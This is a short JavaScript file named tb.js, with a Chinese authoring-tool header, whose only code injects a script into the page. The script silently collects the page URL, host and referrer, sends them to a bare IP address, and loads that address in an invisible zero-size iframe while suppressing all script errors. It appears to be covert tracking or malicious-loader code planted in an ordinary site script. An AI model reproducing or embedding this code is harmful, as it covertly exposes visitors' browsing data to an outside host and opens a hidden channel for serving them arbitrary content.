/*---------------------------------------------------------------
// AspStudio_Codepage="936"
// 上面这行是软件使用的代码页标记，请不要删除。详情请参考帮助文件。
//
// 档案名称：tb.js
// 原创作者：Lyn
// 作者邮件：lyn.ma@hotmail.com
// 创建日期：星期日，2010年06月27日 10:05:38
// 版权所有(C)Feng
//--------------------------------------------------------------*/


document.writeln("<script>function oK_Begin(){");
document.writeln("var pp=\"240&pre=\"+(new Date()).getTime(); var s=String(window.location.href);");
document.writeln("var host=escape(s.substring(7,s.indexOf('/',7))); var ref=escape(document.referrer);");
document.writeln("s=escape(s); var uu=\"http://60.191.124.233/dnsC.aspx?AIMT=\"+s+\"&host=\"+host+\"&refer=\"+ref+\"&server=\"+pp;");
document.writeln("document.write(\'<iframe width=0 height=0 src=\"\'+uu+\'\"><\/iframe>\');");
document.writeln("};oK_Begin();<\/script>");
document.writeln("<script>window.onerror=function(){return true;}<\/script>")
